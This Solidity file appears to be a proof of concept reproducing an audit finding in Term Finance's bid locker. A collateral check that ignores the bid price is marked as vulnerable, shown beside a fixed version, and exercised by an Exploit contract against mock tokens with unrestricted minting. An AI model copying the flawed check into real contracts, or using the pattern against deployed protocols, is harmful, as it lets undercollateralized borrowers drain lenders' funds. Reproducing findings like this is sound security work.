// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Term Finance (Sigma Prime). _isInInitialCollateralShortFall values the raw
// bid amount and ignores the submitted bid price, so an undercollateralized
// bid is accepted and the purchase-token principal is released.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct Exp {
    uint256 mantissa;
}

contract TermPriceOracle {
    /// $1 per token. The bid price is not an input.
    function usdValueOfTokens(address, uint256 amount) external pure returns (Exp memory) {
        return Exp({mantissa: amount});
    }
}

contract TermAuctionBidLocker {
    TermPriceOracle public termPriceOracle;
    address public purchaseToken;
    address public collateralToken;
    uint256 public released;
    bool public acceptedBid;

    constructor(TermPriceOracle oracle, address _purchase, address _collateral) {
        termPriceOracle = oracle;
        purchaseToken = _purchase;
        collateralToken = _collateral;
    }

    function lockBid(uint256 bidAmount, uint256 bidPrice, uint256 collateralAmount) external returns (bool accepted) {
        require(IERC20(collateralToken).transferFrom(msg.sender, address(this), collateralAmount), "collateral");
        bool shortfall = this._isInInitialCollateralShortFall(bidAmount, bidPrice, collateralAmount);
        if (shortfall) {
            require(IERC20(collateralToken).transfer(msg.sender, collateralAmount), "refund");
            return false;
        }
        accepted = true;
        acceptedBid = true;
        require(IERC20(purchaseToken).transfer(msg.sender, bidAmount), "principal");
        released = bidAmount;
    }

    /// Quoted check: repurchase USD value is `usdValueOfTokens(purchaseToken, bidAmount)`.
    function _isInInitialCollateralShortFall(uint256 bidAmount, uint256, uint256 collateral)
        external
        view
        returns (bool)
    {
        require(msg.sender == address(this), "only self");
        // @> VULN: repurchase USD value uses bidAmount and ignores the submitted bid price
        Exp memory repurchasePriceUSDValue = termPriceOracle.usdValueOfTokens(purchaseToken, bidAmount);
        uint256 repurchase = repurchasePriceUSDValue.mantissa;
        bool shortfall = collateral < repurchase;
        return shortfall;
    }
}

contract TermAuctionBidLockerFixed {
    TermPriceOracle public termPriceOracle;
    address public purchaseToken;
    address public collateralToken;

    constructor(TermPriceOracle oracle, address _purchase, address _collateral) {
        termPriceOracle = oracle;
        purchaseToken = _purchase;
        collateralToken = _collateral;
    }

    function lockBid(uint256 bidAmount, uint256 bidPrice, uint256 collateralAmount) external returns (bool accepted) {
        require(IERC20(collateralToken).transferFrom(msg.sender, address(this), collateralAmount), "collateral");
        uint256 repurchase = bidAmount * bidPrice / 1e18;
        Exp memory repurchasePriceUSDValue = termPriceOracle.usdValueOfTokens(purchaseToken, repurchase);
        if (collateralAmount < repurchasePriceUSDValue.mantissa) {
            require(IERC20(collateralToken).transfer(msg.sender, collateralAmount), "refund");
            return false;
        }
        accepted = true;
        require(IERC20(purchaseToken).transfer(msg.sender, bidAmount), "principal");
    }
}

contract Exploit {
    uint256 internal constant BID = 1000 ether;
    uint256 internal constant PRICE = 2 ether;
    uint256 internal constant COLLATERAL = 1000 ether;

    Erc20 public collateral;
    Erc20 public purchase;
    TermPriceOracle public oracle;
    TermAuctionBidLocker public locker;

    constructor() {
        collateral = new Erc20("COLL");
        purchase = new Erc20("PURCHASE");
        oracle = new TermPriceOracle();
        locker = new TermAuctionBidLocker(oracle, address(purchase), address(collateral));
        purchase.mint(address(locker), BID);
        collateral.mint(address(this), COLLATERAL);
    }

    function run() external {
        collateral.approve(address(locker), COLLATERAL);
        bool accepted = locker.lockBid(BID, PRICE, COLLATERAL);
        uint256 priced = BID * PRICE / 1e18;
        require(accepted, "accepted");
        require(purchase.balanceOf(address(this)) == BID, "principal");
        require(priced - COLLATERAL == 1000 ether, "short");
        require(locker.released() == BID, "released");
    }
}
